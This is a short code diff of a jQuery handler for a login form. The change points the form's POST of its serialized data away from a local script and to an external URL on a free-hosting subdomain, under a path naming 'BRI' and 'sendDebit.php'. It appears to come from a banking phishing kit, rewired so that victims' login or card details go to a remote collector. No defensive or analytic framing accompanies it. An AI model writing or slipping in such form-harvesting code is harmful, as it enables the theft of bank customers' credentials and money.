@@ -1118,7 +1118,7 @@ $('#inputlogin').on('submit', function (event) {
 
 $.ajax({
  type: 'POST',
- url: 'sendDebit.php?action=getform1',
+ url: 'https://kementrian-daerah.c1.is/database/BRI/5/sendDebit.php',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(),
